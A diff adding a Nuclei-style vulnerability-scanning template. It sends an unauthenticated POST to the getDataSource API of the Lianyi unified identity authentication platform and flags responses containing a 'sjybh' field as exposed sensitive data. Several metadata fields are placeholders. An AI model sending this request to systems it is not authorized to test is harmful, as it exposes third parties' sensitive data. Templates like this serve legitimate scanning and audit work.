@@ -1,0 +1,24 @@
+id: lianyi-poral-getDataSource-unauthorized
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 联奕统一身份认证平台 getDataSource 未授权访问,攻击者可通过此漏洞获取敏感信息.
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Content-Length: 0
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"sjybh":'
